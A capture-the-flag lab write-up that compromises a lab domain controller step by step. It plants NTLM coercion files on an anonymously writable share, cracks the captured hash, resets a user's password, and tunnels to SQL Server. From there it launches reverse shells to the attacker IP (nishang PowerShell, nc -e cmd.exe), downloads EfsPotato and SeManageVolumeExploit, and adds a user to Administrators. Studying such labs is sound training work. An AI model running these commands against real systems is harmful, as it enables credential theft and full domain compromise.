---
title: ShareThePain
date: 2026-09-08 09:00:00 +0000
categories: [HacksmarterLabs]
tags: [windows, active-directory, smb, null-authentication, ntlm-capture, password-cracking, bloodhound, acl-abuse, forcechangepassword, bloodyad, evil-winrm, port-forwarding, ligolo, mssql, impacket, seimpersonateprivilege, efspotato, semanagevolumeprivilege, privilege-escalation, domain-compromise]
media_subpath: /images/hacksmarter_sharethepain/
image:
  path: 'https://images.coursestack.com/63bc86e1-3ab3-43be-b32e-62a676e6dee7/c827a7c0-1268-4756-ba38-f1a7b03808b0'
---

## Summary

**ShareThePain** is a HackSmarter Windows lab built around a single domain controller, `DC01.hack.smarter`. The starting position is no credential at all, and the goal is the flag on the Administrator's desktop. Every step is an ordinary Windows feature used the way it was designed, chained until the design decisions add up to a domain controller.

The way in is an anonymous SMB session. The DC accepts a null bind and, on top of that, one non-default share called `Share` is writable by that anonymous session. A writable share on a network where users browse folders is not a file-storage problem, it is an authentication problem: a dozen ordinary Windows file formats embed a UNC path that the shell or the associated application resolves automatically, and resolving a UNC path to a host that is not in the SMB session cache means an outbound NTLM authentication. Planting a directory full of those files and running a rogue SMB server catches a NetNTLMv2 response for `bob.ross`, which cracks against `rockyou.txt`.

`bob.ross` cannot log on interactively anywhere, but he owns another user's directory object and holds `GenericAll` over it. That is a password reset without any DACL editing, and the account it resets, `alice.wonderland`, is the only member of `Remote Management Users`. WinRM as `alice` gives a shell and the user flag, and a `netstat` from that shell shows the piece the port scan could not: SQL Server listening on `127.0.0.1:1433` only.

The privilege escalation half is a chain of loopback and token facts:

- MSSQL is bound to loopback, so it needs a tunnel (chisel or ligolo-ng) before any SQL tool can reach it.
- `alice.wonderland` is a `sysadmin` login on that instance, which makes `xp_cmdshell` a supported feature rather than an exploit.
- `xp_cmdshell` runs as `NT SERVICE\MSSQL$SQLEXPRESS`, and every service identity ships with `SeImpersonatePrivilege`, which is one EfsPotato away from SYSTEM.
- The same token also carries `SeManageVolumePrivilege`, which is a second, completely independent path to the flag that never becomes SYSTEM at all.

> **Category:** Active Directory, no initial credential. **Starting position:** unauthenticated on the network segment. **Goal:** the Administrator flag on `DC01`. **Theme:** an anonymously writable share farms a domain user's NetNTLMv2, an object-ownership ACE resets a second user, and a loopback SQL instance hands over a service token that holds two different roads to the box.
{: .prompt-info }

---

## 1. Recon

Only one host is in scope. Point NetExec at it first, both to fingerprint it and to write the name resolution we will need for every Kerberos-aware tool afterwards. [NetExec](https://github.com/Pennyw0rth/NetExec) can emit an `/etc/hosts` fragment directly from the SMB negotiation:

```bash
export IP=10.1.24.76
nxc smb $IP --generate-hosts-file hosts
cat hosts | sudo tee -a /etc/hosts
```

```text
SMB  10.1.24.76  445  DC01  [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hack.smarter) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
```

```text
10.1.24.76     DC01.hack.smarter hack.smarter DC01
```

Three facts from that one line shape everything that follows. `signing:True` means SMB signing is required, so any NTLM material we capture cannot be relayed back to SMB on this host. `Null Auth:True` means the server accepted a session with an empty username and empty password. `DC:True` means this is the domain controller, so the local accounts and the domain accounts are the same set.

Fix the rest of the variables now so the commands below stay readable:

```bash
export DOMAIN=hack.smarter
export FQDN=DC01.hack.smarter
```

The service scan is exactly what a domain controller looks like, with WinRM open as the one thing that is not strictly infrastructure:

```bash
nmap -Pn -sVC -p53,88,135,139,389,445,464,593,636,5985,47001 -oN nmap $IP
```

```text
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-08 12:12:26Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: hack.smarter, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
```

Nothing here is exploitable on its own. Note for later that **1433 is absent**: whatever database this box runs, if any, is not reachable from the network.

### The anonymous session

A null session is a session with an empty username and an empty password. Windows still builds a token for it, an anonymous one carrying only the `Everyone` and `ANONYMOUS LOGON` SIDs, and then evaluates share and file ACLs against that token like any other. Modern Windows restricts what the anonymous token may enumerate through `RestrictAnonymous` and `RestrictNullSessAccess`, which is why on a stock DC this returns nothing useful. Here it does not:

```bash
nxc smb $IP -u "" -p "" --shares
```

```text
SMB  10.1.24.76  445  DC01  [+] hack.smarter\:
SMB  10.1.24.76  445  DC01  [*] Enumerated shares
SMB  10.1.24.76  445  DC01  Share           Permissions     Remark
SMB  10.1.24.76  445  DC01  -----           -----------     ------
SMB  10.1.24.76  445  DC01  ADMIN$                          Remote Admin
SMB  10.1.24.76  445  DC01  C$                              Default share
SMB  10.1.24.76  445  DC01  IPC$                            Remote IPC
SMB  10.1.24.76  445  DC01  NETLOGON                        Logon server share
SMB  10.1.24.76  445  DC01  Share           READ,WRITE
SMB  10.1.24.76  445  DC01  SYSVOL                          Logon server share
```

Five of those six are default. The sixth, named `Share`, is the lab, and the `Permissions` column says the anonymous token has both `READ` and `WRITE` on it. That is the entire foothold: we can put files where domain users will see them.

> The `Permissions` column that NetExec prints is the result of an actual access check, not a guess from the share list. It tries to open the share for read and again for write and reports what succeeded, which is why a blank column next to `C$` and a populated one next to `Share` mean genuinely different things. Background on the protocol and the tooling lives on the [SMB theory page](/theory/protocols/smb).
{: .prompt-tip }

---

## 2. Farming NetNTLMv2 from a Writable Share

### Why a file can steal a password hash

Windows resolves UNC paths (`\\host\share\file`) transparently and everywhere. The moment any component asks the shell or the SMB redirector to touch `\\10.200.21.153\anything`, the client opens a TCP session to that host and negotiates authentication. Since the target is not in the SMB session cache and offers no Kerberos SPN we hold a ticket for, SSPI falls back to NTLM and sends the logged-on user's NetNTLMv2 response, unprompted.

The trick is that a surprising number of ordinary file formats contain a field for a path, and the software that reads them resolves that path *before* the user does anything more deliberate than look at the folder. Two categories matter:

- **Fires on browse**, with no double-click at all: `desktop.ini`, `.scf`, `.url` with an `IconFile`, `.lnk`, `.library-ms`, `Autorun.inf`. Explorer reads these to render the folder's icons, so merely opening the directory in Explorer triggers the fetch.
- **Fires on open**: `.rtf`, `.docx`, `.xlsx`, `.pdf`, `.m3u`, `.asx`, `.jnlp`, `.application`. The associated application resolves the embedded path when the document loads.

[`ntlm_theft`](https://github.com/Greenwolf/ntlm_theft) generates one file per variant so you do not have to remember which format uses which field:

```bash
python3 ntlm_theft.py -g all -s 10.200.21.153 -f theft
```

```text
Created: theft/theft.scf (BROWSE TO FOLDER)
Created: theft/theft-(url).url (BROWSE TO FOLDER)
Created: theft/theft-(icon).url (BROWSE TO FOLDER)
Created: theft/theft.lnk (BROWSE TO FOLDER)
Created: theft/theft.rtf (OPEN)
Created: theft/theft-(stylesheet).xml (OPEN)
Created: theft/theft-(fulldocx).xml (OPEN)
Created: theft/theft.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: theft/theft-(includepicture).docx (OPEN)
Created: theft/theft-(remotetemplate).docx (OPEN)
Created: theft/theft-(externalcell).xlsx (OPEN)
Created: theft/theft.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
Created: theft/theft.asx (OPEN)
Created: theft/theft.jnlp (OPEN)
Created: theft/theft.application (DOWNLOAD AND OPEN)
Created: theft/theft.pdf (OPEN AND ALLOW)
Created: theft/theft.library-ms (BROWSE TO FOLDER)
Created: theft/Autorun.inf (BROWSE TO FOLDER)
Created: theft/desktop.ini (BROWSE TO FOLDER)
Created: theft/theft.theme (THEME TO INSTALL)
Generation Complete.
```

The generated files are tiny and worth reading, because they show there is no exploit involved. A Shell Command File is four lines of INI that name a remote icon:

```ini
[Shell]
Command=2
IconFile=\\10.200.21.153\tools\nc.ico
[Taskbar]
Command=ToggleDesktop
```

`desktop.ini`, the file Explorer already consults in every folder to decide how to draw it, is even shorter:

```ini
[.ShellClassInfo]
IconResource=\\10.200.21.153\aa
```

And the `.url` variant hides the UNC in an icon reference rather than the URL itself, so the shortcut looks harmless even if someone reads it:

```ini
[InternetShortcut]
URL=whatever
WorkingDirectory=whatever
IconFile=\\10.200.21.153\%USERNAME%.icon
IconIndex=1
```

Every one of these is documented, supported behaviour. None of them is a parsing bug.

### Planting them

Upload the whole directory to `Share` over the anonymous session. `recurse on` walks the local tree and `prompt off` stops `smbclient` from asking per file:

```bash
smbclient //$IP/Share -N
```

```text
smb: \> recurse on
smb: \> prompt off
smb: \> mput *
putting file theft-(icon).url as \theft-(icon).url
putting file theft.asx as \theft.asx
putting file theft.m3u as \theft.m3u
putting file theft.rtf as \theft.rtf
putting file theft-(url).url as \theft-(url).url
putting file theft.lnk as \theft.lnk
putting file theft.scf as \theft.scf
putting file theft.application as \theft.application
```

### Catching the authentication

The listener has to be an SMB server, not a raw socket, because the client will negotiate a real session and expects a challenge. [Impacket](https://github.com/fortra/impacket)'s `smbserver.py` is that server, and it logs the NetNTLMv2 response of everyone who tries to authenticate:

```bash
smbserver.py -smb2support shares . -debug
```

`-smb2support` matters on a modern network: without it the server only speaks SMBv1, which Windows Server 2022 no longer has installed, so the connection dies during negotiation and nothing is captured. A minute later, the lab's simulated user browses the share:

```text
[*] Incoming connection (10.1.24.76,49840)
[*] AUTHENTICATE_MESSAGE (HACK\bob.ross,DC01)
[*] User DC01\bob.ross authenticated successfully
[*] bob.ross::HACK:aaaaaaaaaaaaaaaa:40a96da64495cd9b836f2d1823ea2fc5:0101000000000000...
```

That blob is not a password hash in the reusable sense. It is a *response*: `HMAC-MD5(NTLM_hash, server_challenge || client_blob)`. Decoding the client blob shows exactly what the victim thought it was talking to:

```bash
python3 -c "
import sys
b = bytes.fromhex(open('bob.ross_hash').read().strip().split(':')[5])
i = 28
while i + 4 <= len(b):
    t = int.from_bytes(b[i:i+2], 'little'); l = int.from_bytes(b[i+2:i+4], 'little')
    print(t, b[i+4:i+4+l].decode('utf-16le', 'replace'))
    i += 4 + l
    if t == 0: break
"
```

```text
1 shcoibWe
3 shcoibWe
2 ZVjMoIwd
4 ZVjMoIwd
7 ...
6 ...
8 ...
10 ...
9 cifs/10.200.21.153
0
```

Attribute 9 is the SPN the client bound the response to: `cifs/10.200.21.153`, our own listener. The random-looking `shcoibWe` and `ZVjMoIwd` are the computer and domain names `smbserver.py` invents for itself. The server challenge, `aaaaaaaaaaaaaaaa`, is Impacket's fixed default rather than a random one, which is harmless for cracking and is a useful fingerprint if you are ever on the defending side of this.

> A NetNTLMv2 response cannot be replayed with pass-the-hash. It is bound to a challenge that only this session used, and to the target name shown above. There are exactly two things you can do with it: crack it offline, or relay it live to a service that will accept it. Here `signing:True` in the very first NetExec line already ruled out relaying back to SMB on the DC, so cracking is the only road. The full relay decision tree is on the [NTLM and Kerberos relay page](/theory/windows/AD/relay).
{: .prompt-warning }

---

## 3. Cracking the Response

NetNTLMv2 is `hashcat` mode 5600. The response is only as strong as the password behind it, and this one is a keyboard-pattern variant of a `rockyou` entry:

```bash
hashcat -m 5600 bob.ross_hash /usr/share/wordlists/rockyou.txt -r best64.rule
```

```text
BOB.ROSS::HACK:aaaaaaaaaaaaaaaa:40a96da64495cd9b836f2d1823ea2fc5:0101...0000:137Password123!@#
```

Validate it against the domain before building anything on top of it, and note what the answer does *not* say:

```bash
export USERAD=bob.ross PASS='137Password123!@#'
nxc smb $FQDN -u $USERAD -p $PASS
nxc winrm $FQDN -u $USERAD -p $PASS
```

```text
SMB   10.1.24.76  445   DC01  [+] hack.smarter\bob.ross:137Password123!@#
WINRM 10.1.24.76  5985  DC01  [-] hack.smarter\bob.ross:137Password123!@#
```

The credential is valid domain-wide but WinRM refuses it. That is not a wrong password, it is an authorization decision: the WinRM endpoint's SDDL only grants `Remote Management Users` and the local administrators, and `bob.ross` is in neither. Whatever this account is for, it is not a shell.

---

## 4. From bob.ross to alice.wonderland

### Asking the directory what we can write

Rather than guess, ask LDAP. [`bloodyAD`](https://github.com/CravateRouge/bloodyAD)'s `get writable` walks every object the current principal can see and reports, per object, which parts of it the current token may modify:

```bash
bloodyAD -d $DOMAIN --host $FQDN -u $USERAD -p $PASS get writable
```

```text
distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=hack,DC=smarter
permission: WRITE

distinguishedName: CN=bob.ross,CN=Users,DC=hack,DC=smarter
permission: WRITE

distinguishedName: CN=alice.wonderland,CN=Users,DC=hack,DC=smarter
permission: CREATE_CHILD; WRITE
OWNER: WRITE
DACL: WRITE
```

The first two entries are noise and it is worth knowing why, so you do not chase them on the next box. `CN=S-1-5-11` is the Foreign Security Principal object for `Authenticated Users`, and `CN=bob.ross` is our own account, which every user may partly write (the self-write ACEs that let you update your own `userPassword`, SPNs and similar). Both appear on a stock domain.

The third entry does not. `OWNER: WRITE` and `DACL: WRITE` on *another user's* object means we can rewrite who owns `alice.wonderland` and rewrite her DACL, which is unconditional control of that account.

### Confirming it with BloodHound

Collect the graph to see the shape of it rather than a flat list. Either collector works, and running both is a cheap cross-check:

```bash
bloodhound-ce-python -u $USERAD -p $PASS -ns $IP -d $DOMAIN -dc $FQDN -c all --zip
rusthound-ce --domain $DOMAIN -f $FQDN -u $USERAD -p $PASS -c All -z
```

```text
7 users parsed!
61 groups parsed!
1 computers parsed!
2 gpos parsed!
MachineAccountQuota: 10
```

The ACEs on `alice.wonderland` come out as three separate grants held directly by `bob.ross`, none of them inherited:

| Edge | What it grants |
|---|---|
| `Owns` | Implicit `WriteDacl` and `ReadControl` |
| `WriteOwner` | Reassign ownership to any principal |
| `GenericAll` | Every right, including Reset Password |

That third one is why the abuse is a single command. The usual ACL dance, take ownership, then write yourself a `FullControl` ACE, then reset, exists to *manufacture* `GenericAll` when you only hold `WriteOwner` or `WriteDacl`. Here `GenericAll` is already granted, and `GenericAll` subsumes the `User-Force-Change-Password` extended right, so the reset works immediately:

```bash
bloodyAD -d $DOMAIN --host $FQDN -u $USERAD -p $PASS set password alice.wonderland 'P@$$word123!'
```

```text
[+] Password changed successfully!
```

> `Owns` is the ACL edge people skip over because it is not an ACE at all, it is the `nTSecurityDescriptor` owner field. Windows grants the owner of an object `WRITE_DAC` and `READ_CONTROL` implicitly and permanently, which means an owner can always restore their own access no matter how the DACL is edited. Auditing DACLs without also auditing ownership misses this class of control entirely. The [ACL theory page](/theory/windows/AD/acl) breaks down each right and its abuse.
{: .prompt-danger }

### Why alice specifically

Because she is the only account that can use the one interactive service on the box:

```bash
export USERAD=alice.wonderland PASS='P@$$word123!'
nxc ldap $FQDN -u $USERAD -p $PASS --group "remote management users"
```

```text
LDAP  10.1.24.76  389  DC01  [+] hack.smarter\alice.wonderland:P@$$word123!
LDAP  10.1.24.76  389  DC01  alice.wonderland
```

One member, and we just took it. For completeness the domain has one more user, `tyler.ramsey`, who is a Domain Admin, but nothing in this graph reaches him: the path runs through the SQL service instead.

> Resetting a password on a shared lab is destructive in a way that reading a hash is not. `alice.wonderland` had no other route in this environment, but on a real engagement prefer [shadow credentials](/theory/windows/AD/shadow-credentials) or a targeted Kerberoast off the same `GenericAll`, both of which recover a usable credential without locking the real user out.
{: .prompt-warning }

---

## 5. WinRM, the User Flag, and the Port the Scan Missed

```bash
evil-winrm -i $FQDN -u $USERAD -p $PASS
```

[`evil-winrm`](https://github.com/Hackplayers/evil-winrm) lands us in a PowerShell session as `alice.wonderland`. A quick look at the profile roots confirms the whole user population and shows where the user flag lives:

```powershell
tree /f C:\Users
```

```text
C:.
+---Administrator
+---alice.wonderland
|   +---Desktop
|   |       user.txt
+---bob.ross
+---Public
+---tyler.ramsey
```

The user flag is `C:\Users\alice.wonderland\Desktop\user.txt`.

Now the part the external scan could not see. From inside the host, enumerate what is actually listening:

```powershell
netstat -ano | findstr /i listening
```

```text
  TCP    0.0.0.0:88             0.0.0.0:0    LISTENING   688
  TCP    0.0.0.0:389            0.0.0.0:0    LISTENING   688
  TCP    0.0.0.0:445            0.0.0.0:0    LISTENING   4
  TCP    0.0.0.0:3389           0.0.0.0:0    LISTENING   528
  TCP    0.0.0.0:5985           0.0.0.0:0    LISTENING   4
  TCP    0.0.0.0:9389           0.0.0.0:0    LISTENING   3264
  TCP    10.1.24.76:53          0.0.0.0:0    LISTENING   3040
  TCP    127.0.0.1:53           0.0.0.0:0    LISTENING   3040
  TCP    127.0.0.1:1433         0.0.0.0:0    LISTENING   4132
  TCP    127.0.0.1:56517        0.0.0.0:0    LISTENING   4132
```

`127.0.0.1:1433` is SQL Server, and the bind address is the whole point: a socket bound to `127.0.0.1` rather than `0.0.0.0` is unreachable from any other machine, at any speed of port scan. The instance was invisible to `nmap` not because a firewall dropped the packets but because the kernel never had a socket to hand them to.

> Always re-enumerate listening sockets from inside a new foothold. An external scan tells you what the host exposes to the network; `netstat` tells you what the host actually runs. Loopback-only services are common precisely because administrators consider them "not exposed", which usually means they are also the least hardened thing on the box.
{: .prompt-tip }

---

## 6. Reaching a Loopback Service

To use a SQL client from our own machine, `127.0.0.1:1433` *on the DC* has to be given an address our machine can route to. Two tools do this differently and both are worth knowing. Background and the SSH equivalents are on the [port forwarding theory page](/theory/misc/portforward).

### Option A: chisel, one port at a time

[chisel](https://github.com/jpillora/chisel) tunnels TCP over HTTP/WebSocket. Run the server on the attacker in reverse mode, so the client is the one that dials out (the DC allows outbound, it does not allow inbound):

```bash
chisel server --reverse -p 9002
```

Then on the DC, fetch the client and ask for one reverse mapping. `R:1433:127.0.0.1:1433` reads "open 1433 on the *server* and forward it to 127.0.0.1:1433 as seen from the *client*":

```powershell
curl.exe http://10.200.21.153:8000/chisel.exe -o C:\programdata\chisel.exe
C:\programdata\chisel.exe client 10.200.21.153:9002 R:1433:127.0.0.1:1433
```

```text
server: Reverse tunnelling enabled
server: Listening on http://0.0.0.0:9002
server: session#1: tun: proxy#R:1433=>1433: Listening
```

The instance is now at `127.0.0.1:1433` on the attacker machine:

```bash
nxc mssql 127.0.0.1
```

```text
MSSQL  127.0.0.1  1433  DC01  [*] Windows Server 2022 Build 20348 (2019 RTM 15.0.2000) (name:DC01) (domain:hack.smarter)
```

Chisel is not limited to single ports. Replacing the `R:1433:...` mapping with `R:socks` turns the same reverse session into a SOCKS proxy, which reaches every address the DC can, the same coverage ligolo gives, but consumed through `proxychains` rather than a routed interface. That is deliberately not the path taken here: `proxychains` intercepts each connection through `LD_PRELOAD` and does not carry ICMP or raw sockets, so it is worth avoiding when a cleaner option exists. For a single loopback port, a plain `R:1433` forward is the quicker tool, and when the goal is "make the whole host routable", ligolo's TUN interface below does it without `proxychains` at all.

### Option B: ligolo-ng, the whole host as an interface

[ligolo-ng](https://github.com/nicocha30/ligolo-ng) works one level lower. Instead of mapping individual ports it creates a TUN interface on the attacker and routes an entire address range through the agent, so every tool works unmodified against real addresses. Start the proxy:

```bash
sudo ligolo-proxy -selfcert
```

Create an interface and route `240.0.0.1/32` into it. That address is ligolo's convention for "the agent's own loopback": traffic sent to `240.0.0.1` comes out of the agent as traffic to `127.0.0.1`, which is exactly the translation we need here.

```text
ligolo-ng >> interface_create --name loc
ligolo-ng >> interface_route_add --name loc --route 240.0.0.1/32
```

Run the agent from the WinRM session and start the tunnel:

```powershell
C:\programdata\agent.exe -connect 10.200.21.153:11601 -ignore-cert
```

```text
INFO[0221] Agent joined.  id=0ed381627e45 name="HACK\\alice.wonderland@DC01" remote="10.1.24.76:50385"
```

```text
ligolo-ng >> session
? Specify a session : 1 - HACK\alice.wonderland@DC01 - 10.1.24.76:50385
[Agent : HACK\alice.wonderland@DC01] >> tunnel_start --tun loc
```

```bash
nxc mssql 240.0.0.1 -u $USERAD -p $PASS
```

```text
MSSQL  240.0.0.1  1433  DC01  [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hack.smarter)
MSSQL  240.0.0.1  1433  DC01  [+] hack.smarter\alice.wonderland:P@$$word123! (Pwn3d!)
```

`(Pwn3d!)` from the `mssql` module has a precise meaning: the login mapped to a server principal in the `sysadmin` fixed server role. Somebody granted the domain user `alice.wonderland` sysadmin on this instance, which is a configuration choice, not a vulnerability, and it is the hinge of the whole privilege escalation.

---

## 7. MSSQL to Code Execution

### Windows auth, not SQL auth

The first connection attempt fails, and the error is the interesting part:

```bash
mssqlclient.py $DOMAIN/$USERAD:$PASS@240.0.0.1
```

```text
[*] Encryption required, switching to TLS
[-] ERROR(DC01\SQLEXPRESS): Line 1: Login failed for user 'alice.wonderland'.
```

SQL Server has two independent authentication systems. *SQL logins* are usernames and passwords stored in the `master` database; *Windows logins* are SIDs mapped to AD principals, authenticated by NTLM or Kerberos. By default `mssqlclient.py` sends a SQL login, so the server looked for a SQL principal literally named `alice.wonderland`, found none, and refused. `-windows-auth` switches to an NTLM handshake and the same credential now resolves against the domain:

```bash
mssqlclient.py $DOMAIN/$USERAD:$PASS@240.0.0.1 -windows-auth
```

```text
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (HACK\alice.wonderland  dbo@master)>
```

### xp_cmdshell

`xp_cmdshell` is a stock extended stored procedure that hands a string to `cmd.exe`. It is disabled by default and only `sysadmin` may re-enable it, which is exactly the role we just confirmed. `mssqlclient.py` wraps the two `sp_configure` calls and the `RECONFIGURE` behind one helper:

```text
SQL (HACK\alice.wonderland  dbo@master)> enable_xp_cmdshell
INFO(DC01\SQLEXPRESS): Configuration option 'show advanced options' changed from 1 to 1.
INFO(DC01\SQLEXPRESS): Configuration option 'xp_cmdshell' changed from 1 to 1.
```

A first attempt at running a command is instructive because it looks like it worked and did not:

```text
SQL (HACK\alice.wonderland  dbo@master)> xp_cmdshell cmd whoami
output
-----------------------------------------------
Microsoft Windows [Version 10.0.20348.587]
(c) Microsoft Corporation. All rights reserved.
NULL
C:\Windows\system32>
```

That is the `cmd.exe` banner and a prompt, not the output of `whoami`. `xp_cmdshell` already runs its argument through `cmd.exe /c`, so `cmd whoami` launched a *second*, interactive `cmd.exe` and passed `whoami` as a bare argument, which `cmd` ignores without `/c`. Drop the wrapper and the command runs:

```text
SQL (HACK\alice.wonderland  dbo@master)> xp_cmdshell whoami
output
-----------------------------------------------
nt service\mssql$sqlexpress
```

### A shell out of it

`xp_cmdshell` is one command per round trip with no state, so promote it to an interactive shell. Build the payload from [nishang](https://github.com/samratashok/nishang)'s one-line TCP reverse shell. Line 3 of that file is the payload, commented out, so `cut -c2-` strips the leading `#`; PowerShell's `-EncodedCommand` expects UTF-16LE base64, which is what `iconv` and `base64` produce:

```bash
cat /tools/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1 |
  head -n3 | tail -n1 |
  sed 's/192.168.254.1/10.200.21.153/g' |
  sed 's/4444/9999/g' |
  cut -c2- |
  iconv -t utf-16le |
  base64 -w 0
```

```text
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMgAwADAALgAyADEALgAxADUAMwAnACwAOQA5ADkAOQApADsA...
```

```bash
rlwrap nc -lvnp 9999
```

```text
SQL (HACK\alice.wonderland  dbo@master)> xp_cmdshell powershell -enc JABjAGwAaQBlAG4AdAAgAD0A...
```

```text
Connection from 10.1.24.76:50419

PS C:\Windows\system32> whoami
nt service\mssql$sqlexpress
```

We are now running as the SQL Server service account. Note that the identity is a *virtual account* (`NT SERVICE\MSSQL$SQLEXPRESS`), created per-service by the SCM. It is not a domain account, so there is no password to steal and no SPN to Kerberoast. Its value is entirely in its token.

---

## 8. SYSTEM via SeImpersonatePrivilege

```powershell
whoami /priv
```

```text
Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

Two enabled privileges on that list are each sufficient to finish the box. Take `SeImpersonatePrivilege` first.

`SeImpersonatePrivilege` exists so a server can act as the client that called it: SQL Server checks file access as the connecting user, IIS serves content as the authenticated visitor. Because that is a normal server need, every service identity gets it by default. For an attacker it means that *any* code execution inside a service context begins one step from SYSTEM, and the only remaining problem is to make a SYSTEM process authenticate to a pipe we control.

`EfsPotato` solves that with MS-EFSR: it calls `EfsRpcEncryptFileSrv` over the `\pipe\lsarpc` named pipe, which makes `lsass` (running as SYSTEM) connect back to a pipe in our own process. We impersonate that connection and spawn a process with the resulting token. This is the CVE-2021-36942 family, and unlike the spooler-based variants it still works on Server 2022.

```powershell
cd C:\programdata
curl.exe http://10.200.21.153:8000/EfsPotato.exe -o efs.exe
.\efs.exe whoami
```

```text
[+] Current user: NT Service\MSSQL$SQLEXPRESS
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=19c46410)
[+] Get Token: 820
[!] process with pid: 5340 created.
==============================
nt authority\system
```

The tool reports its own identity first and then the identity of the process it spawned, so those two lines together are the proof that the token swap happened. Full mechanics and the variant matrix are on the [logon types and privileges page](/theory/windows/logon-and-privileges).

Rather than work through one-shot SYSTEM commands, use it once to make the shell we already have permanent:

```powershell
.\efs.exe "cmd /c net localgroup administrators alice.wonderland /add"
```

```text
The command completed successfully.
```

```powershell
net user alice.wonderland
```

```text
Local Group Memberships      *Administrators       *Remote Management Use
Global Group memberships     *Domain Users
```

On a domain controller `BUILTIN\Administrators` is not an ordinary local group. A DC has no local SAM database for principals, so that group's membership is stored in the directory and its members are administrators of the domain controller itself, which is where the domain's secrets live. Adding a domain user to it is effectively granting Domain Admin.

The reconnection is required, not optional. Group membership is stamped into an access token at logon time and never refreshed, so the existing WinRM session's token predates the change and still lacks the `Administrators` SID. A fresh authentication builds a new token:

```bash
evil-winrm -i $FQDN -u $USERAD -p $PASS
```

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

```text
<redacted>
```

> Nothing in this chain is a memory-corruption bug, and this last step is the clearest example: `SeImpersonatePrivilege` is documented, intended, and granted by default to every service. The mitigation is not a patch, it is not letting untrusted code reach a service context in the first place. Sysadmin on a SQL instance is administrative access to the host that runs it, and a DBA who hands out `sysadmin` to a domain user has handed out the machine.
{: .prompt-danger }

---

## 9. Alternate Root: SeManageVolumePrivilege

The second enabled privilege gets to the same file without ever becoming SYSTEM, and it is worth doing separately because the mechanism is unrelated.

`SeManageVolumePrivilege` is "Perform volume maintenance tasks", granted so that defragmenters, disk-quota tools and `SetFileValidData` callers can work. It authorizes volume-level maintenance operations that bypass the normal file-security checks, and the consequence is that a holder can rewrite the DACLs on the volume's root, and by inheritance the whole disk. [SeManageVolumeExploit](https://github.com/CsEnox/SeManageVolumeExploit) does precisely that and nothing else.

Take a plain `cmd` shell this time, since the payload does not need PowerShell:

```powershell
upload /tools/Aux/exe/nc64.exe C:\programdata\nc64.exe
```

```text
SQL (HACK\alice.wonderland  dbo@master)> xp_cmdshell c:\programdata\nc64.exe -e cmd.exe 10.200.21.153 9999
```

```text
C:\ProgramData>curl.exe http://10.200.21.153:8000/SeManageVolumeExploit.exe -O

C:\ProgramData>.\SeManageVolumeExploit.exe
Entries changed: 1338
DONE
```

`Entries changed: 1338` is the count of ACLs rewritten on `C:\`. `BUILTIN\Users` now has full control over the volume, so the service account can read directories it was never granted:

```text
C:\Users\Administrator\Desktop>type root.txt
<redacted>

C:\Users\Administrator\Desktop>whoami
nt service\mssql$sqlexpress
```

Those last two lines are the whole point of showing this path. The identity never changed. There was no token theft, no impersonation, no new process; the files simply stopped being protected. An EDR watching for `CreateProcessWithTokenW` or for a service account spawning `cmd.exe` as SYSTEM sees none of that here.

> The two roots start from the same token, one second apart, and look nothing alike in telemetry. `whoami /priv` is not a checklist item to run and forget: read every enabled entry, because privileges are independent primitives and the second one you ignore is often quieter than the first one you used.
{: .prompt-tip }

---

## Understanding the Attack Chain

Not one step here is a memory-corruption bug or an unpatched service. Every component behaves as configured, and the compromise lives in how the configuration decisions compose. The table separates what each piece is worth alone from what it is worth in sequence.

| Primitive | Where it lives | Severity in isolation | Severity composed |
|---|---|---|---|
| Null SMB session | `RestrictAnonymous` on DC01 | Low: share names | The delivery channel for everything |
| Anonymous write on `Share` | Share ACL | Medium: file drop | Plants coercion files where users browse |
| UNC auto-resolution | Explorer and Office | By design | Turns a folder listing into an NTLM auth |
| NetNTLMv2 capture | `smbserver.py` listener | Medium: one response | `bob.ross` material to crack offline |
| Weak password | `bob.ross` | High if reachable | First valid domain credential |
| `Owns` on alice's object | Implicit `WriteDacl` | Medium: ACL control | Ownership that survives DACL edits |
| `GenericAll` on alice | Direct ACE from `bob.ross` | Critical for one account | Password reset, no DACL rewrite needed |
| `Remote Management Users` | One member: alice | Low: WinRM access | The only interactive service on the box |
| Loopback bind on 1433 | SQL Server config | None externally | Invisible to scans, reachable post-foothold |
| `sysadmin` for a domain user | SQL Server role | Critical by design | `xp_cmdshell` becomes a supported feature |
